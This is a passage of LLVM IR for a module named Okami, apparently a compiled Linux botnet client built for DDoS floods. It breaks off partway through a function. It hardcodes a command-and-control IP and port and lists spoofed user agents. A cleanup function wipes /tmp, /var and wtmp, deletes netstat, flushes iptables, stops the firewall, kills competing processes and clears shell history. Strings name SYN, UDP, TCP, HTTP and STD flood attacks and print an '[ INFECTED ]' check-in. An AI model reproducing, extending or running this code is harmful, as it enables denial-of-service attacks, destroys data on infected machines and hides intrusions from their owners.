; ModuleID = 'host/ir_O2/Okami.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }

@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"168.235.109.208:6963\00", align 1
@useragents = local_unnamed_addr global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.17 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.18 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.20 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.21 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.23 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.24 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.25 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.27 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.28 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.30 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.31 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.33 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.36 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.37 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.38 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.39 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.40 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.41 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.42 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.43 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.44 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.45 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.46 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.47 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.48 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.49 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.51 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.52 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.53 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.54 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.55 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.56 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.57 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.58 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.59 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.60 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.61 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.62 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.63 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.64 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.65 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.66 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.67 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.68 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.69 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.70 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.71 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.72 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.133 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.73 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.75 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)], align 16
@.str.76 = private unnamed_addr constant [17 x i8] c"WYHRzp68omQcEaoW\00", align 1
@.str.77 = private unnamed_addr constant [17 x i8] c"xYjPH0XYQyNnZDd4\00", align 1
@.str.78 = private unnamed_addr constant [20 x i8] c"KaDeNTheBoTNETHeGOD\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"Iger8HgN8DU5Cv2m\00", align 1
@.str.80 = private unnamed_addr constant [17 x i8] c"E0H2DeSLyzQ93Bh2\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"zhYf0MvzTJ1S0ivq\00", align 1
@.str.82 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.83 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.84 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.85 = private unnamed_addr constant [17 x i8] c"UQX1v4chpBay13JL\00", align 1
@.str.86 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.87 = private unnamed_addr constant [17 x i8] c"X1k5ICjenaWIZ4Gf\00", align 1
@.str.88 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.89 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.90 = private unnamed_addr constant [17 x i8] c"1cvFW1QcSuZ627CQ\00", align 1
@.str.91 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.92 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.93 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.95 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.96 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.97 = private unnamed_addr constant [21 x i8] c"UkXK4CDG3OBO1vVufiKv\00", align 1
@.str.98 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.99 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.100 = private unnamed_addr constant [17 x i8] c"SllNepLi918c9I8J\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"Kaden1337\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.104 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.112 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"STDHEX\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.120 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.121 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.122 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.128 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.130 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0)) #7
  %2 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0)) #7
  %3 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0)) #7
  %4 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0)) #7
  %5 = tail call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0)) #7
  %6 = tail call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0)) #7
  %7 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0)) #7
  %8 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0)) #7
  %9 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0)) #7
  %10 = tail call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i64 0, i64 0)) #7
  %11 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i64 0, i64 0)) #7
  %12 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i64 0, i64 0)) #7
  %13 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i64 0, i64 0)) #7
  ret void
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #3 {
min.iters.checked:
